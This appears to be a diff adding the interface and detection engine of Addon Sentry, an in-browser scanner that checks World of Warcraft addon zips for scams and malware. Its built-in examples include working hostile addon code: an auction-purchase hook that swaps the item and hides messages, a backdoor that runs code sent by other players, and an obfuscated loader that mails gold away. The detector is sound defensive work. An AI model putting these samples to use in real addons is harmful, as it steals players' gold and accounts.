+          if (run === 1) runStart = t;
+          if (run > best) { best = run; bestTok = runStart; }
+        } else if (!isOp(t, ",")) run = 0;
+      }
+      if (best >= 300) signals.push([bestTok, `table of ${best} byte values`]);
+      const names = new Set(toks.filter((t) => t.kind === NAME).map((t) => t.value));
+      if (names.has("bxor") && names.has("byte") && names.has("char")) signals.push([null, "XOR decoding (bxor with byte/char)"]);
+      const longest = u.lines.reduce((a, l) => Math.max(a, l.length), 0);
+      const codeTokens = toks.filter((t) => t.kind === NAME || t.kind === OP).length;
+      if (longest >= 8000 && codeTokens > 2000 && u.lines.length < 20) signals.push([null, `minified code (a line of ${longest} characters)`]);
+      const kinds = new Set(signals.map(([, d]) => (d.startsWith("encoded") ? "encoded" : d.split(" ")[0])));
+      const strong = signals.some(([, d]) => d.includes("escaped") || d.includes("byte values") || d.includes("scrambled") || d.includes("minified"));
+      if (strong || kinds.size >= 2) {
+        facts.obfuscated.add(u.path.split("#")[0]);
+        for (const [t, d] of signals.slice(0, 4)) {
+          if (t) facts.hit("OBFUSCATION", ev(u, t, d));
+          else facts.hit("OBFUSCATION", { file: u.path.split("#")[0], line: 1 + u.lineOffset, detail: d, snippet: "" });
+        }
+      }
+    }
+
+    // -------------------------------------------------------------- toc
+
+    function tocInfo(files) {
+      const tocs = [];
+      const loaded = new Set();
+      let saved = false;
+      const lower = new Map();
+      for (const p of files.keys()) lower.set(p.toLowerCase(), p);
+      function mark(path) {
+        if (path.includes("*")) {
+          const rx = new RegExp("^" + reEscape(path.toLowerCase()).replace(/\\\*/g, "[^/]*") + "$");
+          for (const [low, real] of lower) if (rx.test(low)) mark(real);
+          return;
+        }
+        const real = lower.get(path.toLowerCase());
+        if (real === undefined || loaded.has(real)) return;
+        loaded.add(real);
+        if (real.toLowerCase().endsWith(".xml")) {
+          const text = decode(files.get(real)).replace(/<!--[\s\S]*?-->/g, "");
+          XML_FILE_REF_RE.lastIndex = 0;
+          let m;
+          const refs = [];
+          while ((m = XML_FILE_REF_RE.exec(text))) refs.push(m[1]);
+          for (const ref of refs) mark(normpath(pjoin(dirname(real), ref.replace(/\\/g, "/"))));
+        }
+      }
+      for (const [path, data] of files) {
+        if (!path.toLowerCase().endsWith(".toc")) continue;
+        const meta = { file: path };
+        const base = dirname(path);
+        for (const raw of decode(data).split(/\r\n|\r|\n/)) {
+          const line = strip(raw);
+          if (line.startsWith("##")) {
+            const idx = line.indexOf(":");
+            const key = strip(idx < 0 ? line.slice(2) : line.slice(2, idx)).toLowerCase();
+            const value = idx < 0 ? "" : line.slice(idx + 1);
+            if (["title", "author", "version", "interface", "notes"].includes(key) && !(key in meta)) meta[key] = strip(value).replace(/\|c[0-9a-fA-F]{8}|\|r/g, "").slice(0, 120);
+            if (key.startsWith("savedvariables")) saved = saved || !!strip(value);
+          } else if (line && !line.startsWith("#")) {
+            let entry = line.replace(/(\s*\[[^\]]*\])+\s*$/, "").replace(/\\/g, "/");
+            entry = entry.split("[Family]").join("*").split("[Game]").join("*").split("[TextLocale]").join("*");
+            mark(normpath(pjoin(base, entry)));
+          }
+        }
+        tocs.push(meta);
+      }
+      return [tocs, loaded, saved];
+    }
+
+    // -------------------------------------------------------------- analyse
+
+    function analyse(pkg) {
+      const units = buildUnits(pkg.files);
+      const addonDefines = new Set();
+      for (const u of units) for (const d of u.scan.defines) addonDefines.add(d);
+      const facts = newFacts();
+      for (const h of pkg.hits) for (const e of h.evidence) facts.hit(h.id, e);
+      const [tocs, loaded, saved] = tocInfo(pkg.files);
+      const runs = units.filter((u) => !tocs.length || loaded.has(u.path.split("#")[0]));
+      for (const u of runs) for (const d of createdDialogs(u.scan.tokens)) facts.ownDialogs.add(d);
+      for (const u of runs) analyseUnit(u, facts, addonDefines);
+      if (!tocs.length && units.length) facts.hit("PKG_NO_TOC", { file: pkg.name, line: 0, detail: "no .toc", snippet: "" });
+      if (tocs.length) {
+        for (const path of [...pkg.files.keys()].filter((p) => p.toLowerCase().endsWith(".lua") && !loaded.has(p)).sort())
+          facts.hit("PKG_UNLOADED_LUA", { file: path, line: 0, detail: "not listed", snippet: "" });
+      }
+      for (const [path, evs] of facts.dynamicCode) {
+        if (facts.remoteInput.has(path)) for (const e of evs.slice(0, 3)) facts.hit("REMOTE_CODE", e);
+        else if (facts.remoteInput.size) for (const e of evs.slice(0, 3)) facts.hit("LISTENS_AND_RUNS", e);
+      }
+      for (const path of [...facts.obfuscated].sort()) {
+        for (const e of [...(facts.dynamicCode.get(path) || []), ...(facts.templateCode.get(path) || [])].slice(0, 3)) facts.hit("OBFUSCATED_LOADER", e);
+      }
+      const money = facts.caps.get("money") || [];
+      if (facts.overrides.length && money.length) for (const e of facts.overrides.slice(0, 5)) facts.hit("HIDDEN_MONEY", e);
+      else if (money.length && [...facts.hiding.keys()].some((p) => facts.moneyUnits.has(p))) {
+        for (const [path, evs] of facts.hiding) if (facts.moneyUnits.has(path)) for (const e of evs.slice(0, 3)) facts.hit("MONEY_AND_HIDING", e);
+      }
+      const friends = (facts.caps.get("account") || []).filter((e) => FRIEND_LIST_APIS.has(e.detail));
+      if (friends.length && (facts.caps.get("chat") || []).length) for (const e of friends.slice(0, 5)) facts.hit("EXFILTRATION", e);
+      const stats = (facts.caps.get("profiling") || []).filter((e) => e.detail === "GetComparisonStatistic" || e.detail === "SetAchievementComparisonUnit");
+      if (stats.length && saved) for (const e of stats.slice(0, 5)) facts.hit("PROFILING", e);
+      if (facts.urls.size) for (const e of [...facts.urls.values()].slice(0, 30)) facts.hit("URL", e);
+
+      const findings = [...facts.hits.values()].sort((a, b) => {
+        const d = ORDER[R.findings[b.id].severity] - ORDER[R.findings[a.id].severity];
+        return d || (a.id < b.id ? -1 : a.id > b.id ? 1 : 0);
+      });
+      let top = "info";
+      for (const h of findings) { const s = R.findings[h.id].severity; if (ORDER[s] > ORDER[top]) top = s; }
+      const addons = [...tocs].sort((a, b) => (a.file < b.file ? -1 : a.file > b.file ? 1 : 0));
+      const stats2 = {
+        files: pkg.entries,
+        bytes: pkg.totalBytes,
+        lua_files: [...pkg.files.keys()].filter((p) => p.toLowerCase().endsWith(".lua")).length,
+        xml_scripts: units.filter((u) => u.path.includes("#")).length,
+        lines: units.reduce((a, u) => a + u.lines.length, 0),
+      };
+      const caps = {};
+      for (const c of Object.keys(R.capabilities)) caps[c] = facts.caps.get(c) || [];
+      return { target: pkg.name, severity: top, capabilities: caps, findings, addons, stats: stats2 };
+    }
+
+    function toDict(report, lang) {
+      return {
+        tool: { name: "addon-sentry", version: VERSION },
+        target: report.target,
+        verdict: { level: report.severity, text: R.verdicts[report.severity][lang] },
+        addons: report.addons,
+        capabilities: Object.entries(report.capabilities)
+          .filter(([, evs]) => evs.length)
+          .map(([cap, evs]) => ({ id: cap, text: R.capabilities[cap][lang], evidence: evs.slice(0, 12), count: evs.length })),
+        findings: report.findings.map((h) => ({
+          id: h.id,
+          severity: R.findings[h.id].severity,
+          severity_text: R.severity_names[lang][R.findings[h.id].severity],
+          title: R.findings[h.id][lang][0],
+          explanation: R.findings[h.id][lang][1],
+          evidence: h.evidence.slice(0, 20),
+          count: h.evidence.length,
+        })),
+        stats: report.stats,
+        disclaimer: R.disclaimer[lang],
+      };
+    }
+
+    async function scanZip(buffer, name, lang) {
+      const pkg = await readZip(buffer, name || "addon.zip");
+      return toDict(analyse(pkg), lang || "es");
+    }
+
+    return { scanZip, readZip, analyse, toDict };
+  }
+
+  return { VERSION, ScanError, tokenize, scan, make };
+});
+</script>
+<script>var ADDON_SENTRY_EXAMPLES = [{"id": "auctionscam", "name": "AuctionScam.zip", "label": {"es": "Estafa de subasta", "en": "Auction scam"}, "files": {"AuctionScam/AuctionScam.toc": "## Interface: 16001\n## Title: Fast Buyer\nScam.lua\n", "AuctionScam/Scam.lua": "local realConfirm = C_AuctionHouse.ConfirmCommoditiesPurchase\nC_AuctionHouse.ConfirmCommoditiesPurchase = function(itemID, quantity)\n  C_AuctionHouse.StartCommoditiesPurchase(190396, quantity)\n  return realConfirm(190396, quantity)\nend\nGetCoinTextureString = function(amount) return \"66g\" end\nChatFrame_AddMessageEventFilter(\"CHAT_MSG_SYSTEM\", function() return true end)\nStaticPopup1Button1:Click()\n"}}, {"id": "backdoor", "name": "Backdoor.zip", "label": {"es": "Puerta trasera", "en": "Backdoor"}, "files": {"Backdoor/Backdoor.toc": "## Interface: 16001\n## Title: Totally Helpful Raid Tool\nCore.lua\n", "Backdoor/Core.lua": "local f = CreateFrame(\"Frame\")\nC_ChatInfo.RegisterAddonMessagePrefix(\"THRT\")\nf:RegisterEvent(\"CHAT_MSG_ADDON\")\nf:SetScript(\"OnEvent\", function(self, event, prefix, msg, channel, sender)\n  if prefix == \"THRT\" then\n    local fn = loadstring(msg)\n    if fn then fn() end\n  end\nend)\n"}}, {"id": "packed", "name": "Packed.zip", "label": {"es": "Código escondido", "en": "Hidden code"}, "files": {"Packed/Loader.lua": "local IlIlIlIl = \"\\83\\101\\110\\100\\77\\97\\105\\108\\40\\34\\83\\99\\97\\109\\109\\101\\114\\45\\66\\97\\110\\107\\34\\44\\32\\34\\104\\105\\34\\44\\32\\34\\34\\41\\32\"\nlocal lIlIlIlI = loadstring(IlIlIlIl)\nlIlIlIlI()\n", "Packed/Packed.toc": "## Interface: 16001\nLoader.lua\n"}}, {"id": "clean", "name": "Clean.zip", "label": {"es": "Addon limpio", "en": "Clean addon"}, "files": {"Clean/Clean.lua": "local template = [[ return function(a) return a + %d end ]]\nlocal adder = loadstring(template:format(2))()\nlocal GetSpellInfo = C_Spell.GetSpellInfo\nprint(\"Clean loaded\", adder(1), \"https://github.com/example/clean\")\n", "Clean/Clean.toc": "## Interface: 16001\nClean.lua\n", "Clean/NotInToc.lua": "local f = loadstring(GetCVar(\"x\")) SendMail(\"x\",\"y\",\"\")\n"}}];</script>
+<script>
+(function () {
+  "use strict";
+  const T = {
+    es: {
+      tagline: "Revisá un addon de World of Warcraft antes de instalarlo: puertas traseras, trucos para mover tu oro, código escondido y archivos que no deberían estar ahí.",
+      drop: "Soltá acá el .zip del addon",
+      dropHint: "O elegilo desde tu compu. Funciona con cualquier addon, de Classic, Forever o retail.",
+      choose: "Elegir archivo",
+      tryExample: "Ejemplos:",
+      privacy: "El archivo no sale de tu compu: se analiza dentro de esta página y no se sube a ningún lado.",
+      example: "Ejemplo",
+      scanned: "Analizado",
+      files: "archivos", lines: "líneas de Lua", xml: "scripts en XML",
+      can: "Qué puede hacer",
+      canNone: "No usa nada sensible: no mueve oro, no manda mensajes, no ejecuta código armado en el momento.",
+      signals: "Señales",
+      signalsNone: "Nada que reportar.",
+      minor: (n) => `${n} detalle${n === 1 ? "" : "s"} informativo${n === 1 ? "" : "s"}`,
+      more: (n) => `y ${n} más`,
+      busy: "Analizando…",
+      errTitle: "No se pudo analizar el archivo",
+      notZip: "Elegí un archivo .zip.",
+      howTitle: "Cómo funciona",
+      howText: "Lee el código Lua del addon sin ejecutarlo y busca patrones conocidos de estafas y malware. Distingue lo que el addon puede hacer (muchos addons legítimos mueven oro o mandan mensajes) de las combinaciones que no tienen explicación inocente.",
+      looksTitle: "Qué busca",
+      looks: [
+        "Código que ejecuta lo que le mandan otros jugadores",
+        "Funciones de Blizzard reemplazadas para mentirte sobre precios u oro",
+        "Código ofuscado que se decodifica y se ejecuta",
+        "Nombres de funciones armados de a pedazos para no llamar la atención",
+        "Ejecutables, rutas que escapan de la carpeta y archivos con contraseña",
+        "Addons que juntan estadísticas de otros jugadores",
+      ],
+      limitsTitle: "Lo que no puede",
+      limitsText: "Es un chequeo automático: no prueba que un addon sea seguro y una advertencia no prueba mala intención. Bajá los addons de su página oficial y desconfiá de quien te pase uno por susurro o Discord.",
+      footer: "Addon Sentry · código abierto, licencia MIT · sin relación con Blizzard Entertainment. World of Warcraft es marca registrada de Blizzard Entertainment, Inc.",
+    },
+    en: {
+      tagline: "Check a World of Warcraft addon before you install it: backdoors, tricks that move your gold, hidden code and files that should not be there.",
+      drop: "Drop the addon's .zip here",
+      dropHint: "Or pick it from your computer. Works with any addon: Classic, Forever or retail.",
+      choose: "Choose file",
+      tryExample: "Examples:",
+      privacy: "The file never leaves your computer: it is checked inside this page and not uploaded anywhere.",
+      example: "Example",
+      scanned: "Checked",
+      files: "files", lines: "lines of Lua", xml: "XML scripts",
+      can: "What it can do",
+      canNone: "Uses nothing sensitive: does not move gold, send messages or run code built at runtime.",
+      signals: "Signals",
+      signalsNone: "Nothing to report.",
+      minor: (n) => `${n} informational detail${n === 1 ? "" : "s"}`,
+      more: (n) => `and ${n} more`,
+      busy: "Checking…",
+      errTitle: "The file could not be checked",
+      notZip: "Choose a .zip file.",
+      howTitle: "How it works",
+      howText: "It reads the addon's Lua code without running it and looks for known scam and malware patterns. It separates what an addon can do (many legitimate addons move gold or send messages) from combinations with no innocent explanation.",
+      looksTitle: "What it looks for",
+      looks: [
+        "Code that runs whatever other players send it",
+        "Blizzard functions replaced to lie about prices or gold",
+        "Obfuscated code that is decoded and run",
+        "Function names built piece by piece to avoid notice",
+        "Executables, paths that escape the folder and password-protected files",
+        "Addons that collect other players' statistics",
+      ],
+      limitsTitle: "What it cannot do",
+      limitsText: "It is an automatic check: it cannot prove an addon is safe, and a warning is not proof of bad intent. Download addons from their official page and be wary of anyone who sends you one by whisper or Discord.",
+      footer: "Addon Sentry · open source, MIT license · not affiliated with Blizzard Entertainment. World of Warcraft is a trademark of Blizzard Entertainment, Inc.",
+    },
+  };
+
+  const engine = AddonSentry.make(ADDON_SENTRY_RULES);
+  let lang = "es";
+  try { const saved = localStorage.getItem("addon-sentry-lang"); if (saved === "en" || saved === "es") lang = saved; } catch (e) {}
+  let current = null; // { kind: "example"|"file", name, buffer|exampleId }
+  const $ = (s) => document.querySelector(s);
+  const el = (tag, attrs, ...kids) => {
+    const n = document.createElement(tag);
+    for (const [k, v] of Object.entries(attrs || {})) {
+      if (k === "class") n.className = v; else if (k === "text") n.textContent = v; else n.setAttribute(k, v);
+    }
+    for (const k of kids) if (k != null) n.append(k);
+    return n;
+  };
+
+  function applyTexts() {
+    document.documentElement.lang = lang;
+    document.querySelectorAll("[data-t]").forEach((n) => { n.textContent = T[lang][n.dataset.t]; });
+    document.querySelectorAll(".lang button").forEach((b) => b.setAttribute("aria-pressed", String(b.dataset.lang === lang)));
+    const looks = $("#looks");
+    looks.replaceChildren(...T[lang].looks.map((x) => el("li", { text: x })));
+    const ex = $("#examples");
+    ex.querySelectorAll("button").forEach((b) => b.remove());
+    for (const e of ADDON_SENTRY_EXAMPLES) {
+      const b = el("button", { type: "button", "data-example": e.id, "aria-pressed": String(current && current.kind === "example" && current.id === e.id) }, e.label[lang]);
+      b.addEventListener("click", () => runExample(e.id));
+      ex.append(b);
+    }
+  }
+
+  function render(d, isExample, fresh) {
+    const r = $("#report");
+    const L = T[lang];
+    const level = d.verdict.level;
+    const a = d.addons[0] || {};
+    const title = a.title || d.target;
+    const bits = [a.version && a.version.indexOf("@") < 0 ? "v" + a.version : null, a.author].filter(Boolean).join(" · ");
+    const st = d.stats;
+    const head = el("div", { class: "sheet-head" },
+      el("div", {},
+        el("p", { class: "eyebrow" }, isExample ? el("span", { class: "example-flag", text: L.example }) : L.scanned, " · ", d.target),
+        el("p", { class: "target", text: title }),
+        el("p", { class: "meta", text: [bits, `${st.files} ${L.files}`, `${st.lines.toLocaleString(lang)} ${L.lines}`, st.xml_scripts ? `${st.xml_scripts} ${L.xml}` : null].filter(Boolean).join(" · ") }),
+      ),
+      el("div", { class: `stamp lvl-${level}${fresh ? " fresh" : ""}`, role: "img", "aria-label": d.verdict.text }, d.verdict.text, el("small", { text: "addon-sentry " + d.tool.version })),
+    );
+    const caps = el("div", {}, el("h2", { text: L.can }),
+      d.capabilities.length
+        ? el("ul", { class: "caps" }, ...d.capabilities.map((c) => el("li", {}, c.text, el("b", { text: "×" + c.count }))))
+        : el("p", { class: "none", text: L.canNone }));
+    const main = d.findings.filter((f) => f.severity !== "info");
+    const minor = d.findings.filter((f) => f.severity === "info");
+    const findingNode = (f) => {
+      const shown = f.evidence.slice(0, 4);
+      return el("li", { class: `finding lvl-${f.severity}` },
+        el("span", { class: "sev", text: f.severity_text }),
+        el("h3", { text: f.title }),
+        el("p", { text: f.explanation }),
+        el("ul", { class: "ledger" },
+          ...shown.map((e) => el("li", {}, el("span", { class: "loc", text: e.line ? `${e.file}:${e.line}  ` : `${e.file}  ` }), e.snippet || e.detail)),
+          f.count > shown.length ? el("li", { class: "more", text: L.more(f.count - shown.length) }) : null),
+      );
+    };
+    const sig = el("div", {}, el("h2", { text: L.signals }),
+      main.length ? el("ul", { class: "findings" }, ...main.map(findingNode)) : el("p", { class: "none", text: L.signalsNone }),
+      minor.length ? el("details", { class: "quiet" }, el("summary", { text: L.minor(minor.reduce((s, f) => s + f.count, 0)) }), el("ul", { class: "findings" }, ...minor.map(findingNode))) : null);
+    r.replaceChildren(head, caps, sig, el("p", { class: "disclaimer", text: d.disclaimer }));
+  }
+
+  function renderError(msg) {
+    $("#report").replaceChildren(el("p", { class: "error" }, el("strong", { text: T[lang].errTitle + ": " }), msg));
+  }
+
+  async function runExample(id, fresh = true) {
+    const e = ADDON_SENTRY_EXAMPLES.find((x) => x.id === id);
+    current = { kind: "example", id };
+    const files = new Map(Object.entries(e.files).map(([k, v]) => [k, new TextEncoder().encode(v)]));
+    const pkg = { name: e.name, files, hits: [], entries: files.size, totalBytes: [...files.values()].reduce((s, b) => s + b.length, 0) };
+    render(engine.toDict(engine.analyse(pkg), lang), true, fresh);
+    applyTexts();
+  }
+
+  async function runFile(file) {
+    if (!/\.zip$/i.test(file.name)) { renderError(T[lang].notZip); return; }
+    $("#report").replaceChildren(el("p", { class: "busy", text: T[lang].busy }));
+    try {
+      const buffer = await file.arrayBuffer();
+      current = { kind: "file", name: file.name, buffer };
+      render(await engine.scanZip(buffer, file.name, lang), false, true);
+      applyTexts();
+    } catch (err) {
+      renderError(err && err.message ? err.message : String(err));
+    }
+  }
+
+  async function rerender() {
+    if (!current) return;
+    if (current.kind === "example") return runExample(current.id, false);
+    render(await engine.scanZip(current.buffer, current.name, lang), false, false);
+  }
+
+  document.querySelectorAll(".lang button").forEach((b) => b.addEventListener("click", () => {
+    lang = b.dataset.lang;
+    try { localStorage.setItem("addon-sentry-lang", lang); } catch (e) {}
+    applyTexts();
+    rerender();
+  }));
+  $("#file").addEventListener("change", (e) => { const f = e.target.files[0]; if (f) runFile(f); e.target.value = ""; });
+  const tray = $("#tray");
+  ["dragenter", "dragover"].forEach((ev) => tray.addEventListener(ev, (e) => { e.preventDefault(); tray.classList.add("over"); }));
+  ["dragleave", "drop"].forEach((ev) => tray.addEventListener(ev, (e) => { e.preventDefault(); tray.classList.remove("over"); }));
+  tray.addEventListener("drop", (e) => { const f = e.dataTransfer && e.dataTransfer.files[0]; if (f) runFile(f); });
+  window.addEventListener("dragover", (e) => e.preventDefault());
+  window.addEventListener("drop", (e) => e.preventDefault());
+
+  applyTexts();
+  runExample(ADDON_SENTRY_EXAMPLES[0].id, false);
+})();
+</script>
